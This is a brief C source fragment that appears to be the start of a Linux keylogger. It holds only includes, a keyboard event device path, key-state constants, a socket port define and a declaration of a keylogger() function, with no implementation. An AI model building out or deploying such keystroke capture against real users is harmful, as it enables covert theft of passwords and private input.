#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define KEYBOARD_DEVICE "/dev/input/event4"
#define KEY_RELEASE 0
#define KEY_PRESS 1
#define KEY_HELD 2

#define SOCKET_SERVER_PORT 1729

void keylogger();